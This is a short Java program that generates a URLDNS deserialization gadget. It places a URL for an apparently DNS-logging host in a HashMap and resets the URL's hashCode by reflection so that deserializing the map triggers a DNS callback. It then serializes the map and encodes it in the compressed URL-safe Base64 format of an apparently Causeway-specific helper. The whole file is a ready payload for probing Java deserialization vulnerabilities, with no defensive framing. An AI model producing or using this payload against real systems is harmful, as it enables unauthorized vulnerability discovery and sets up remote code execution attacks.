package org.n1es.deserialize;

import org.n1es.deserialize.utils.CausewayBase64Utils;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.util.HashMap;

import static org.n1es.deserialize.utils.DeserializeUtils.*;

public class URLDNS2 {

	public static void main(String[] args) throws Exception {

		HashMap map = new HashMap();
		URL   url = new URL("http://zzvirkbsbt.dgrh3.cn");
		Field f   = Class.forName("java.net.URL").getDeclaredField("hashCode");
		f.setAccessible(true);
		f.set(url,1);
		map.put(url,123);
		f.set(url,-1);

		byte[] bytes = writeObjectToBytes(map);
		byte[] apply = CausewayBase64Utils.asCompressedUrlBase64.apply(bytes);
		System.out.println(new String(apply));
	}
}
